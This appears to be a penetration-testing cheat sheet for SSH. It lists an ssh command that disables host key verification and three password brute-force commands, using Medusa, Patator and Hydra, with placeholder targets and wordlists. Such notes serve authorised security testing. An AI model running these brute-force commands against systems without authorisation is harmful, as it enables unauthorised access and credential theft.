# SSH

% remote shell (secure)

#plateform/linux #target/local #cat/MISC/RECON #protocol/ssh #port/22

## Remote SSH access

ssh with out adding the remote host to KnownHosts file also, ignore if host key and host name don't match

```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" <remote-username>@<ip>
```

## SSH Password Brute Force (Medusa)

uses medusa to brute force passwords for a specified user

```
medusa -h <ip> -M ssh -u <user-name> -P <passwords-file>
```

## SSH Password Brute Force (Patator)

uses patator to brute force passwords for a specified user

```
patator ssh_login host=<ip> user=<user-name> password=FILE0 0=<password-file> -x ignore:mesg='Authentication failed.'
```

## SSH Password Brute Force (Hydra)

uses hydra to brute force ssh passwords for a specified user

```
hydra -l <user-name> -P <password-list> -t <n-threads> ssh://<ip> -o ./ssh-creds.hydra
```
